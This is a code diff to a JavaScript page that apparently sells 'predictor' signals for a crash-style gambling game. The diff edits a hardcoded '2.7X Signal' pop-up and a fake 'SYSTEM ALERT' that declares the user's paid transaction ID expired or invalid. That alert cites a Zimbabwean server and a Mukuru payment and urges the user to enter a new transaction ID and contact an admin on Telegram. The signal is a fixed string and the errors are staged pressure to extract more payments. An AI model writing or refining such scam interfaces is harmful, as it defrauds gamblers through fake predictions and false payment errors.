@@ -53,12 +53,12 @@ function validateActivationCode() {
 function getLiveSignal() {
     document.getElementById("activationCodeSection").style.display = "none";
 
-    // Open 3.4X Signal in New Window
+    // Open 2.7X Signal in New Window
     let xButtonWindow = window.open("", "_blank", "width=400,height=200");
     xButtonWindow.document.write(`
         <html>
         <head>
-            <title>3.4X Predictor</title>
+            <title>2.7X Predictor</title>
             <style>
                 body {
                     font-family: 'Courier New', monospace;
@@ -80,8 +80,8 @@ function getLiveSignal() {
             </style>
         </head>
         <body>
-            <h2>🚀 3.4X Signal Ready!</h2>
-            <button class="x-btn">3.4X</button>
+            <h2>🚀 2.7X Signal Ready!</h2>
+            <button class="x-btn">2.7X</button>
         </body>
         </html>
     `);
@@ -198,13 +198,13 @@ function getLiveSignal() {
                         }
                     </style>
 
-                    <h1>🚨SYSTEM ALERT :  TRANSACTION ID REJECTED: TIMESTAMP VALIDATION FAILED. SUBMISSION EXPIRED. 🚨</h1>
-                    <div class="warning-line">❌ Transaction ID expired. Please submit within an hour(1) of payment.</div>
-                    <div class="warning-line highlight">⚠️ Session terminated due to delayed confirmation <u>EXPIRED</u> transaction</div>
+                    <h1>🚨SYSTEM ALERT :  TRANSACTION ID REJECTED: TIMESTAMP VALIDATION FAILED. SUBMISSION EXPIRED.Get New Code 🚨</h1>
+                    <div class="warning-line">❌ Transaction ID expired. Delayed to enter code!.</div>
+                    <div class="warning-line highlight">⚠️ Session terminated due to delayed confirmation <u>EXPIRED</u> ENTER NEW TRANSACTION ID</div>
                     <div class="warning-line">❌ Transaction ID invalid ZIMBABWE Server TXN ID MUKURU(147897540).</div>
                     <div class="warning-line highlight">⚠️ One Week Key <u>Identical device</u> Zimbabwean Server <u>IP address match✅</u></div>
                     <div class="warning-line">❌ Package authentication failed</div>
-                    <div class="warning-line highlight">⚠️ Your device has been ACTIVE on our system for over one week. IP address verification has been successfully confirmed.</div>
+                    <div class="warning-line highlight">⚠️IP address verification has been successfully confirmed.</div>
                     <button class="contact-btn" onclick="window.open('https://t.me/zayd0011', '_blank')">🚨 CONTACT ADMIN IMMEDIATELY</button>
                 </div>
             `;
